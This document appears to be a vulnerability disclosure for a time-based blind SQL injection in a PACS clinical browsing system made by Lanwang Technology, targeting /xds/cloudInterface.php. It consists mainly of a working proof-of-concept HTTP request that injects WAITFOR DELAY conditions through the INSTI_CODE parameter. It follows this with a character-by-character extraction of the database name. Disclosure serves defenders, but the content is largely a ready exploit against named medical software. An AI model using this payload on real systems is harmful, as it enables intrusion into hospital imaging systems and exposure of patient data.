There is a front-end SQL injection vulnerability in the clinical browsing system of Lanwang Technology Co., Ltd.

1. Impact of vulnerabilities：PACS clinical browsing system
2. Vulnerability location：/xds/cloudInterface.php
 
3.Recurrence of vulnerabilities
The login interface is as shown in the figure

![image](https://github.com/Hefei-Coffee/cve/assets/168982375/fcee47ac-5cc3-4dd1-a464-aac348cf85d3)
Since the SQL injection here is a time-based blind injection, the database name needs to be determined through ASSCII. The POC is as follows
Here, it is judged through truncation that the first position in the database is X
```
GET /xds/cloudInterface.php?INSTI_CODE=1%27);if%20(ascii(substring(db_name(),1,1)))=88%20WAITFOR%20DELAY%20%270:0:5%27--%20q HTTP/1.1
Host: ip:82
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=9ppbslm6ue630ge9ptrdprb0d2
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.1.23
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/d8b9943b-3a76-48a1-ac7d-df84392ee317)
Here, it is judged through truncation that the second digit in the database is D.
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/639218d9-f0ed-43c1-acd4-3ed4a0a8b23e)
Here, it is judged through truncation that the third digit in the database is S.
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/94bd3da6-5056-49da-8cd9-6e93e3c3d35d)
Here, it is judged through truncation that the fourth digit of the database is 7
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/f93af689-3094-4022-a6f1-af059e2f602a)
Here, it is judged by truncation that the fifth bit of the database is 0
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/574f1604-902e-469c-acbc-c3bbf206c8be)
Here, it is judged through truncation that the sixth digit in the database is T
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/5589a4ab-9e48-475e-881a-9033fa2b1ec6)
Here, it is determined through delayed injection that the name of the database is: XDS70T
